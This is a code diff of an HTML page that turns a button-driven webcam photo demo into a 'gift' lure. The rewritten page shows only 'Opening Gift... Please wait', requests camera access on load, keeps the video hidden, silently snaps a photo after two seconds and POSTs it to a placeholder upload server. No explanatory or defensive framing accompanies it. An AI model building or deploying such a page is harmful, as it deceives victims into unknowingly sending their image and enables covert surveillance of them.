@@ -1,75 +1,65 @@
-<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>Camera Photo Capture</title>
+  <title>Camera Link Capture</title>
   <style>
     body {
-      background: #1e1e2f;
+      background: #111;
       color: white;
       text-align: center;
-      font-family: Arial;
-      padding: 40px;
-    }
-
-    #start-camera, #click-photo {
-      padding: 10px 20px;
-      margin: 10px;
-      background-color: #ff4081;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-
-    #video, #captured-image {
-      margin-top: 20px;
-      border-radius: 10px;
-      width: 100%;
-      max-width: 320px;
-    }
-
-    canvas {
-      display: none;
+      padding: 30px;
+      font-family: sans-serif;
     }
   </style>
 </head>
 <body>
 
-  <h2>🎁 Click Gift to Capture Photo</h2>
-  <button id="start-camera">🎁 Open Gift</button>
-  <video id="video" autoplay playsinline></video><br>
-  <button id="click-photo" style="display:none;">📸 Capture</button>
-  <br>
-  <img id="captured-image" src="" alt="Captured Image">
+  <h2>🎁 Opening Gift...</h2>
+  <p>Please wait...</p>
 
-  <canvas id="canvas" width="640" height="480"></canvas>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
   <script>
-    const startCameraButton = document.getElementById('start-camera');
-    const video = document.getElementById('video');
-    const clickPhotoButton = document.getElementById('click-photo');
-    const canvas = document.getElementById('canvas');
-    const capturedImage = document.getElementById('captured-image');
-
-    startCameraButton.addEventListener('click', async () => {
+    async function captureAndSend() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
         video.srcObject = stream;
-        clickPhotoButton.style.display = 'inline-block';
-      } catch (err) {
-        alert("❌ Camera permission denied or not supported");
-        console.error(err);
-      }
-    });
 
-    clickPhotoButton.addEventListener('click', () => {
-      const context = canvas.getContext('2d');
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const imageData = canvas.toDataURL('image/png');
-      capturedImage.src = imageData;
-    });
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            // Stop camera
+            stream.getTracks().forEach(track => track.stop());
+
+            // Send to backend
+            fetch('https://your-server.com/upload', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ image: imageData })
+            })
+            .then(res => res.json())
+            .then(data => {
+              document.body.innerHTML = `<h2>🎉 Thank you!</h2><p>Your photo has been captured.</p>`;
+            })
+            .catch(err => {
+              alert('Error uploading image: ' + err.message);
+            });
+          }, 2000);
+        };
+
+      } catch (err) {
+        alert("Camera Error: " + err.message);
+      }
+    }
+
+    captureAndSend();
   </script>
 
 </body>
